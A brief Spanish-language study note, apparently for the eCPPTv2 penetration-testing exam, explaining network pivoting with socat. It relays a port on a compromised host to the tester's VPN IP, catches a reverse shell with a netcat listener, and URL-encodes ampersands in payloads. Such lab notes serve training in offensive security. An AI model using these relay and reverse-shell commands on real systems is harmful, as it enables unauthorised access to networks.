# eCPPTv2

Binario de socat linux funcional:
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

USO de socat:
socat TCP-LISTEN:1111,fork TCP:10.10.14.14:2222 & 

1111 -> puerto que ponemos en escucha al socat para redirigir el puerto 
10.10.14.14 -> cambiar a nuestra ip de vpn

es decir me pongo en esucha con netcat por el puerto 2222:
nc -lvnp 2222

y en el payload donde se envía la reverse shell ponemos la IP donde no tenemos acceso directamente pero la maquina comprometida si, y el puerto ponemos el 1111, para redirigirlo al nuestro

Si el payload tiene & se urlencodea a %26 para que no de problemas
